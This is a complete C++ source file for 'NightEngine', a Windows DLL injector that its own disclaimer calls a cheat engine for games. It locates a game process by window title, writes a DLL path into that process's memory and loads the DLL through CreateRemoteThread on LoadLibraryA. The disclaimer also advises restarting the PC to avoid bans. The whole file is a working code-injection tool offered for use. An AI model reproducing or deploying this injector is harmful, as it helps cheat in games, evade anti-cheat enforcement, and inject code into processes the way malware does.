#include <iostream>
#include <Windows.h>

char target_window_name[_MAX_PATH] = "NAME ON WINDOW FOR THE GAME";

void SetConsoleColor(int color)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}


// Callback function to handle unhandled exceptions
LONG WINAPI UnhandledExceptionHandler(EXCEPTION_POINTERS* exceptionPointers)
{
	// Perform cleanup here (e.g., closing handles, freeing memory)

	SetConsoleColor(12); // red
	std::cout << "[NE] - Unhandled exception occurred. Cleaning up resources..." << '\n';

	// Return execution to the default unhandled exception filter
	return EXCEPTION_CONTINUE_SEARCH;
}

void ShowDisclaimer()
{
	// Set the console code page to UTF-8
	SetConsoleOutputCP(CP_UTF8);

	// Set the console font to Lucida Console to support Unicode characters
	CONSOLE_FONT_INFOEX cfi;
	cfi.cbSize = sizeof(cfi);
	cfi.nFont = 0;
	cfi.dwFontSize.X = 0;
	cfi.dwFontSize.Y = 16;
	cfi.FontFamily = FF_DONTCARE;
	cfi.FontWeight = FW_NORMAL;
	wcscpy_s(cfi.FaceName, L"Lucida Console");
	SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), FALSE, &cfi);

	// Set console colors
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 13); // light cyan

	// Define the disclaimer lines using Unicode characters
	const wchar_t* lines[] = {
		L"╔══════════════════════════════════════════════════════════╗",
		L"║                NightEngine - Disclaimer                  ║",
		L"╠══════════════════════════════════════════════════════════╣",
		L"║                                                          ║",
		L"║   NightEngine is a cheat engine created by Fako#0666.    ║",
		L"║   NightEngine/Fako is not responsible for any bans or    ║",
		L"║   damage that may occur. When you are done hacking       ║",
		L"║   using NightEngine, it is strongly recommended to       ║",
		L"║   **restart** your PC. This is to avoid potential bans   ║",
		L"║   in other games.                                        ║",
		L"║                                                          ║",
		L"╚══════════════════════════════════════════════════════════╝",
	};

	// Display the disclaimer using Unicode characters with animation
	for (const wchar_t* line : lines)
	{
		Sleep(100); // Delay between each line
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), line, wcslen(line), NULL, NULL);
		std::cout << std::endl;
	}

	// Reset console colors
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
	std::cout << "Type 'Y' to agree and proceed or 'N' to exit: ";

	// Set the console code page back to the original value
	SetConsoleOutputCP(GetACP());
}






bool GetUserConfirmation()
{
	char input;
	std::cin >> input;
	input = std::toupper(input);
	return input == 'Y';
}



int main() 
{
	// Set the unhandled exception filter
	SetUnhandledExceptionFilter(UnhandledExceptionHandler);

	ShowDisclaimer();

	if (!GetUserConfirmation())
	{
		SetConsoleColor(12); // red
		std::cout << "[NE] - User declined the agreement. Exiting..." << '\n';
		Sleep(2000);
		return 0;
	}

	bool result{};
	char full_path[_MAX_PATH]{};
	result = GetModuleFileNameA(NULL, full_path, _MAX_PATH);
	if (result == 0)
	{
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to get the full file path of the dll." << '\n';
		return 1;
	}

	char* last_slash = strrchr(full_path, '\\');
	if (last_slash != NULL) {
		strcpy_s(last_slash + 1, _MAX_PATH - (last_slash - full_path + 1), "YOUR.dll");
	}
	else {
		strcpy_s(full_path, _MAX_PATH, "YOUR.dll");
	}

	// Check if the DLL at the target path actually exists.
	FILE* dllExists;
	fopen_s(&dllExists, full_path, "r");
	if (dllExists == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Could not find the DLL to inject." << '\n';
		return 1;
	}

	// Get a handle to the window of the target.
	HWND windowHandle = FindWindowA(NULL, target_window_name);
	if (windowHandle == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to get window handle. Error Code: " << GetLastError() << '\n';
		return 1;
	}

	// Get the process PID.
	DWORD PID{};
	GetWindowThreadProcessId(windowHandle, &PID);

	if (PID == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to get window PID. Error Code: " << GetLastError() << '\n';
		return 1;
	}

	// Open a handle to the target process.
	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (pHandle == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed get a handle to the process. Error Code: " << GetLastError() << '\n';
		return 1;
	}

	// Allocate memory in the target process.
	LPVOID memory = VirtualAllocEx(pHandle, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (memory == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to allocate memory in the target process. Error Code: " << GetLastError() << '\n';
		return 1;
	}

	// Write the DLL path into the allocated memory in the target process.
	result = WriteProcessMemory(pHandle, memory, full_path, strlen(full_path), NULL);
	if (result == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to write process memory at the target process. Error Code: " << GetLastError() << '\n';
		return 1;
	}

	HMODULE kernelHandle = GetModuleHandleA("KERNEL32");
	if (kernelHandle == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to get a handle to the kernel." << '\n';
		return 1;
	}

	// Get a pointer to LoadLibraryA.
	LPVOID LoadLibrary_addr = GetProcAddress(kernelHandle, "LoadLibraryA");
	if (LoadLibrary_addr == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to get address to LoadLibraryA." << '\n';
		return 1;
	}

	// Create a thread at LoadLibraryA and pass in the DLL path at the allocated memory as the arg.
	HANDLE LLAThread = CreateRemoteThread(pHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibrary_addr, memory, NULL, NULL);
	if (LLAThread == NULL) {
		SetConsoleColor(12); // red
		std::cout << "[NE] - Failed to create remote thread at LoadLibraryA." << '\n';
		return 1;
	}

	// Wait for the remote thread to finish executing before closing the handle to the target process.
	WaitForSingleObject(LLAThread, INFINITE);

	// Close the handle to the target process.
	CloseHandle(pHandle);

	SetConsoleColor(10); // green
	std::cout << "[NE] - Injection succeeded!\n";

	Sleep(2000);

	return 0;
}